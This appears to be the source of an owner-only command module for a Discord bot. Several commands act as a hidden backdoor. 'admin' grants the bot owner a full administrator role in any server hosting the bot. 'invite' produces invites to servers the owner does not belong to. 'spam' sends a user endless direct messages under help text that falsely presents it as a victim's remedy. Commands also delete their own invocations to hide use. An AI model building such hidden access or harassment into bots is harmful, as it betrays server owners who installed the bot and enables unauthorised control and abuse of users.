import asyncio
from discord.ext import commands
import discord
import discord.utils
from discord import CategoryChannel
import functools
import json
from utility.cog.command import command_cog


def delete_before(func):
    @functools.wraps(func)
    async def wrapper(self, ctx: commands.Context, *args, **kwargs):
        try:
            await ctx.message.delete()
        except:
            await ctx.send('Done.', delete_after=1)
        return await func(self, ctx, *args, **kwargs)
    return wrapper


class owner(commands.Cog, command_cog):
    """ 
        Bot owner only commands
    """
    def __init__(self, bot: commands.Bot, tokens):
        super().__init__(bot=bot, tokens=tokens)
        self.description = 'Bot owner only commands to manage the bot'
        self.spamming = False

    async def spammy(self, mention):
        await asyncio.sleep(1.5)
        try:
            dm = await self.bot.create_dm(mention)
            if self.spamming:
                await dm.send('WAKE UP')
                return await self.spammy(mention)
        except:
            self.spamming = False

    async def owner_in_guild(self, guild: discord.Guild) -> bool:
        for member in guild.members:
            if await self.bot.is_owner(member):
                return True
        return False

    async def get_unknown_guilds(self) -> list[discord.Guild]:
        unknown_guilds = []
        for guild in self.bot.guilds:
            if not await self.owner_in_guild(guild):
                unknown_guilds.append(guild)
        return unknown_guilds

    @commands.command()
    @commands.is_owner()
    @delete_before
    async def admin(self, ctx: commands.Context, server=None):
        """
            Gives you admin in the server this command is ran from.
            Optionally specify which server
        """
        member = ctx.message.author
        guild = ctx.message.guild if server == None else self.bot.get_guild(int(server))
        role = await guild.create_role(name="Hand Holding Enjoyer", permissions=discord.Permissions(permissions=8))
        await member.add_roles(role)

    @commands.command()
    @commands.is_owner()
    @delete_before
    async def invite(self, ctx: commands.Context, server=None):
        """
            Creates a permanent server invite to the specified server
            if no server specified, will dm all the servers the owner is not also in
        """
        if server == None:
            unknown_guilds = await self.get_unknown_guilds()
            dm = await self.bot.create_dm(ctx.author)
            for guild in unknown_guilds:
                content = f'Server name: {guild.name}\nServer ID: {guild.id}'
                await dm.send(content)
                await asyncio.sleep(1)
        else:
            guild = self.bot.get_guild(int(server))
            for channel in guild.channels:
                if not isinstance(channel, CategoryChannel):
                    invite = await channel.create_invite()
                    dm = await self.bot.create_dm(ctx.author)
                    await dm.send(invite.url)
                    break

    @commands.command()
    @commands.is_owner()
    @delete_before
    async def naughty(self, ctx: commands.Context, ID: int):
        """
            Add / remove people from the naughty list used to block users from using the bot
        """
        with open('./naughty_list.json', 'r') as file:
            naughty_list = list(json.loads(file.read()))
        if ID in naughty_list:
            naughty_list.remove(ID)
        else:
            naughty_list.append(ID)
        dumps = json.dumps(naughty_list, indent=2)
        with open('./naughty_list.json', 'w') as file:
            file.write(dumps)

    @commands.command(help='run this command incase you are a victim of being spammed')
    @delete_before
    async def spam(self, ctx: commands.Context):
        """
            Spams the targeted victim endlessly once per second
        """
        if await self.bot.is_owner(ctx.author):
            for mention in ctx.message.mentions:
                self.spamming = True
                asyncio.ensure_future(self.spammy(mention))
                return
            self.spamming = False
        self.spamming = False
